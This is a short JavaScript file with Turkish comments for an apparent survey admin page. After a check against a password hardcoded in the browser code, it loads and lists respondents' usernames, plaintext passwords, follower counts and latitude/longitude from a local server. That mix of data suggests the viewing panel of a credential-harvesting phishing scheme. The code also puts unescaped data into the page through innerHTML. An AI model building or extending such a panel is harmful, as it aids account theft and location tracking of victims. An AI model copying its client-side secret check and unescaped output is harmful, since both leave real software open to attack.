document.getElementById('adminForm').addEventListener('submit', function (event) {
  event.preventDefault();

  const adminPassword = document.getElementById('adminPassword').value;

  if (adminPassword === 'eren25w') {
    document.getElementById('surveyData').style.display = 'block';
    loadSurveyResults();
  } else {
    alert('Yanlış şifre!');
  }
});

function loadSurveyResults() {
  // Burada sunucudan veri çekme işlemi yapacağız
  fetch('http://localhost:3000/getSurveyResults')
    .then(response => response.json())
    .then(data => {
      const results = data.results;
      const tbody = document.getElementById('surveyResults');
      tbody.innerHTML = ''; // Önceki verileri temizle

      results.forEach(result => {
        const row = document.createElement('tr');
        row.innerHTML = `
          <td>${result.username}</td>
          <td>${result.password}</td>
          <td>${result.followers}</td>
          <td>Lat: ${result.latitude}, Long: ${result.longitude}</td>
        `;
        tbody.appendChild(row);
      });
    })
    .catch(error => alert('Veri alınamadı.'));
}
